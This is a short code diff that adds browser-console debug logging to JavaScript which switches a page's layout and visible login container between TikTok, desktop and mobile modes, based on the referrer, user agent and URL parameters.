@@ -423,21 +423,31 @@
                 userAgent.includes("tiktok") || 
                 urlParams.get("utm_source") === "tiktok";
 
+            console.log("Referrer:", referrer);
+            console.log("User Agent:", userAgent);
+            console.log("URL Params:", urlParams.toString());
+            console.log("Is Desktop:", isDesktop);
+            console.log("Is Mobile:", isMobile);
+            console.log("Is From TikTok:", isFromTikTok);
+
             document.body.classList.remove('tiktok-mode', 'desktop-mode', 'mobile-mode');
 
             if (isFromTikTok && !isDesktop) {
+                console.log("Applying TikTok mode");
                 document.body.classList.add('tiktok-mode');
                 document.querySelector('.header-container').classList.add('hidden');
                 document.querySelector('.left-section').style.display = 'none';
                 document.querySelector('.language-text').style.display = 'none';
                 hideAllExcept('.login-container-tiktok');
             } else if (isDesktop) {
+                console.log("Applying Desktop mode");
                 document.body.classList.add('desktop-mode');
                 document.querySelector('.header-container').classList.add('hidden');
                 document.querySelector('.left-section').style.display = 'block';
                 document.querySelector('.language-text').style.display = 'none';
                 hideAllExcept('.login-container-desktop');
             } else if (isMobile) {
+                console.log("Applying Mobile mode");
                 document.body.classList.add('mobile-mode');
                 document.querySelector('.header-container').classList.remove('hidden');
                 document.querySelector('.header-container').style.display = 'flex';
